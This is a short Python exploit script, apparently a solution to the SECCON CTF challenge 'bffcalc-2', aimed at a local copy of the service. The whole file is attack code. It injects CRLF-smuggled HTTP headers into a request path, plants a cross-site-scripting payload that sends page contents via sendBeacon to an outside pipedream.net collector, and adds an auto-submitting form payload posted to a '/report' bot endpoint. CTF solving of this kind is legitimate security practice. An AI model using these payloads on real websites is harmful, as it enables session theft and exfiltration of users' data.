import requests
import html
from urllib import parse

# BASE_URL = 'http://bffcalc-2.seccon.games:3000'
BASE_URL = 'http://localhost:3000'

payload2 = '\r\n'
payload2 += 'Host: localhost\r\n'
payload2 += 'Content-Length: 770\r\n'
payload2 += 'Content-Type: application/x-www-form-urlencoded\r\n'
payload2 += '\r\n'
payload2 += 'expr=<script>window.onload=()=>navigator.sendBeacon("https://enghd2bd35t7sh5.m.pipedream.net",btoa(window.a.innerHTML))</script><div id=a>'

path = f'/api{parse.quote(payload2)}'

print(path)

print('body:')
# print(requests.get(BASE_URL + path).text)

escaped = html.escape(f'document.body.innerHTML=\'<form id="hoge" action="{path}" method="POST"></form><img src=x onerror="setTimeout(()=>window.hoge.submit(),2000)">\'')
payload = f'<img src=x onerror="{escaped}">'
data={
  'expr': payload
}
print(payload)
requests.post(BASE_URL + '/report', data=data)
